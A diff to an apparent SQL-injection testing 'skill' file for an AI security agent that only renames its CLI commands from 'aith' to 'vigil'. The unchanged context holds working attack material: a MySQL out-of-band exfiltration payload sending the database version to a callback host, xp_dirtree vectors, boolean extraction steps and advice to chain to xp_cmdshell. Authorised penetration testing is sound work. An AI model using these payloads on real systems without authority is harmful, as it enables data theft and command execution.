@@ -1,7 +1,7 @@
 ---
 name: sqli-testing
 description: Detect and exploit SQL injection vulnerabilities in web application parameters
-origin: AI Threat Hunting
+origin: Vigil
 ---
 
 # SQL Injection Testing
@@ -96,7 +96,7 @@ START
   |
   v
 [3d] Out-of-Band (when time-based is unreliable)
-  |-- Requires OOB callback infrastructure. Confirm with `aith oob status --json`.
+  |-- Requires OOB callback infrastructure. Confirm with `vigil oob status --json`.
   |-- Mint a nonce-tagged host, embed it, then poll for the correlated hit
   |     (replaces reading the listener log by hand). See "Out-of-Band Correlation" below.
   |-- MySQL:  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.<NONCE_HOST>\\a'))--
@@ -112,7 +112,7 @@ START
 Mint a unique callback host per injection point and let the correlator bind the hit to the probe — never eyeball the listener log:
 
 ```bash
-aith oob mint --technique sqli --target-url "https://target/item?id=1" --param id --probe-kind dns
+vigil oob mint --technique sqli --target-url "https://target/item?id=1" --param id --probe-kind dns
 # -> nonce  <prefix>-<token>
 #    dns    <prefix>-<token>.oob.example.com   (use as <NONCE_HOST> above)
 ```
@@ -120,7 +120,7 @@ aith oob mint --technique sqli --target-url "https://target/item?id=1" --param i
 Substitute the minted host for `<NONCE_HOST>` in the payloads above (xp_dirtree is the single most reliable vector — not disabled by default, no sysadmin needed), deliver via the kali exec wrapper, then:
 
 ```bash
-aith oob poll --client <name> --json
+vigil oob poll --client <name> --json
 ```
 
 A non-empty `matched` array for your nonce is the confirmation: each match pairs the callback (`protocol`, `remote_address`) with the recorded probe (`technique`, `target_url`). For a `CONCAT(version(),...)`-style exfil payload the leaked DB version arrives as the left label of the matched callback host. Reproduce from a second independent payload shape before declaring, then chain to file read / `xp_cmdshell` where the DB supports it. Empty `matched` after the payload lands → fall back to boolean/time-based and record a runtime issue.
@@ -132,8 +132,8 @@ A non-empty `matched` array for your nonce is the confirmation: each match pairs
 At decision-tree node `[2]`, before hand-rolling probes, classify the value the parameter currently carries and let the oracle generate type-aware variants. This is most productive for ID-bearing and JSON-body parameters — the `format` bucket directly exercises the type-confusion path this skill flags (ORMs that parameterize scalars but pass objects/arrays unsafely):
 
 ```bash
-aith assess classify-payload "42" --mutations          # type: sequential_id
-aith assess classify-payload "2025-06-01" --mutations  # type: date
+vigil assess classify-payload "42" --mutations          # type: sequential_id
+vigil assess classify-payload "2025-06-01" --mutations  # type: date
 ```
 
 Consume by intent bucket:
@@ -177,7 +177,7 @@ Collect one record per probe (the TRUE/FALSE pair, ideally interleaved with a fe
 
 ```bash
 # each line: {"url":"...AND 1=1","status":200,"content_length":5120,"words":410,"lines":88}
-aith assess anomaly-score boolean_probes.jsonl --top 5
+vigil assess anomaly-score boolean_probes.jsonl --top 5
 ```
 
 Consume the ranking: the oracle buckets near-equal lengths/words so dynamic jitter clusters together, and **degrades the weight of near-unique columns** so a per-response CSRF token cannot dominate. If the `AND 1=1` and `AND 1=2` rows fall into *different* buckets while your benign baselines cluster, that structural split is your boolean differential — promote it and start `SUBSTRING(...)` extraction against the side that flips. If TRUE, FALSE, and baselines all score ~0 (same buckets), the parameter is not boolean-injectable on this signal — drop to `[3c]` time-based. This is also the triage step for an Intruder/sqlmap fuzz dump: feed the whole result set in and investigate the top-ranked outlier first.
